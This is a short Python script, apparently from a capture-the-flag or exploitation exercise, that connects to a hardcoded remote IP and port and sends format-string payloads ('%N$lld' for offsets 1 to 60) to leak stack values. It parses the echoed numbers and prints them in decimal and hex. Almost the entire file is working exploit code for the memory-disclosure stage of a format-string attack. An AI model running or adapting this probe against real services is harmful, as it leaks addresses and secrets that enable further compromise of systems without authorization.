#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642

def read_until_prompt(s):
    d=b''
    s.settimeout(1.5)
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            d+=c
            if d.count(b'> ')>=2 and b'\n' in d: 
                # stop when we've got a full echo line + next prompt
                if d.endswith(b'> '): break
    except Exception: pass
    return d

s=socket.socket(); s.settimeout(2); s.connect((HOST,PORT))
s.recv(300)
leaks={}
for n in range(1, 61):
    s.send(("%%%d$lld\n" % n).encode())
    time.sleep(0.03)
    d=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            d+=c
    except Exception: pass
    m=re.search(rb'(?m)^[> ]*([0-9-]+)\n', d)
    if m:
        leaks[n]=int(m.group(1))
    else:
        leaks[n]=('RAW', d)
s.close()
for n in range(1,61):
    v=leaks[n]
    if isinstance(v,tuple):
        print(n, 'RAW', repr(v[1]))
    else:
        print(n, v, hex(v & ((1<<64)-1)))
